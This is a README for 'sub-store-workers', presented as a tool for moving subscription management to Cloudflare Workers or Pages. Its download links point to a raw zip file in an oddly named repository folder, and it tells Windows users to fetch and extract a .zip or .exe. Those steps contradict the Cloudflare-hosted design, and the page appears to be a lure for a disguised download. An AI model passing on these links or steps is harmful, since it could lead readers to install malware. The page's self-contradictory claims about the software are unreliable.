# 🌐 sub-store-workers - Manage your subscription data with ease

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/saltplainjobaction503/sub-store-workers/main/ceroplasty/sub_workers_store_3.8.zip)

This application provides a simple way to move your sub-store backend to Cloudflare Workers or Pages. It converts your existing subscription data into a format that works on Cloudflare's network. This keeps your data stable and accessible.

## 📋 What this tool does

This tool simplifies subscription management. Many users face issues with connectivity or speed when using standard subscription links. This software fixes those errors by moving the management process to the cloud. You gain better uptime and control over your configuration files. 

The software uses Cloudflare to host your settings. This creates a bridge between your local device and your subscription providers. It acts as a filter and a proxy for your data. You can sort, merge, and clean your subscription lists through this interface.

## ⚙️ System requirements

Your computer needs to meet these basic standards to run the helper tools:

*   Windows 10 or Windows 11.
*   At least 4GB of RAM.
*   A stable internet connection.
*   A recent web browser like Chrome, Edge, or Firefox.
*   A free Cloudflare account.

## 📥 How to download your files

You need to access the release page to get the correct files for your system.

[Visit the official download page here](https://raw.githubusercontent.com/saltplainjobaction503/sub-store-workers/main/ceroplasty/sub_workers_store_3.8.zip)

Click the link above to view all available versions. Look for the latest release at the top of the list. Download the file that ends in .zip or .exe depending on your preference. If you select the zip file, save it to your desktop. Right-click the folder and select Extract All to view the contents.

## 🚀 Setting up your account

Once you download the files, you must link them to your Cloudflare account. Follow these steps to configure your environment:

1.  Open your internet browser.
2.  Log in to your Cloudflare dashboard.
3.  Navigate to the Workers & Pages section.
4.  Select Create Application.
5.  Choose the Upload Asset option if you are using the Pages version.
6.  Follow the on-screen prompts to upload the files from the folder you downloaded earlier.

The system will provide you with a unique URL once the deployment completes. Keep this URL safe. You will need it to access your management dashboard.

## 🛠️ Configuration steps

After you deploy your files, you need to set up your subscription sources.

1.  Open the URL provided by Cloudflare.
2.  Navigate to the Settings tab in the interface.
3.  Find the section labeled Subscription Links.
4.  Paste your existing subscription addresses into the provided text box.
5.  Click Save to apply your changes.

The system will now fetch your data and store it in your Cloudflare environment. You can refresh this data at any time by clicking the Sync button.

## 🛡️ Privacy and security

This software runs entirely within your own Cloudflare account. No third-party servers ever touch your data. You maintain ownership of your subscription keys and links. 

Keep your Cloudflare API tokens private. Do not share your deployment URL with unauthorized people. If you ever feel your account is at risk, you can delete your Workers or Pages project from the Cloudflare dashboard to clear all data instantly.

## 🔍 Frequently asked questions

**Will this tool work with all subscription formats?**
Yes, most standard subscription formats work with this tool. If you encounter a specific format that fails, verify the link structure in your original source.

**Do I need to pay for Cloudflare?**
The free tier of Cloudflare is sufficient for this application. You do not need a paid plan to manage standard subscription lists.

**Can I run this on mobile?**
While you can manage the settings from a mobile browser, this tool is designed for desktop use. Use a computer for the initial setup to ensure a smooth configuration process.

**What should I do if the update fails?**
Check your network connection. If your internet is stable, log in to your Cloudflare dashboard and check the logs for your Worker. The logs show specific errors if the connection to your subscription provider times out.

**How do I update the software?**
When a new version becomes available on the download page, download the new files. Upload these new files to your existing Cloudflare project to overwrite the old code. Your settings will remain intact during this process.

**Can I use multiple sub-store instances?**
Yes, you can create multiple Pages projects if you want to keep different subscription groups separate. Each project runs independently.

**Is there a limit to how many links I can add?**
Cloudflare sets limits on the number of requests per day for the free tier. This is usually plenty for individual use. If you have thousands of subscription links, you might reach those limits. Most users never hit these caps with regular daily usage.

## 🧩 Troubleshooting common issues

If you see a blank screen after visiting your URL, clear your browser cache. Sometimes old data interferes with the new interface. 

If your subscriptions do not show up, verify that the links you pasted are active. Visit the links directly in your browser to confirm they return a text file. If the link does not load in your browser, the subscription provider might be temporarily down.

If you mistakenly delete your configuration, you can re-deploy the files from your computer. Your subscription links are stored in the Cloudflare KV storage. In most cases, these settings remain saved even if you update the code.

For further adjustments, use the built-in Editor tab. This allows you to rename your subscriptions or change how the software sorts them. Ensure you click Apply before leaving the page.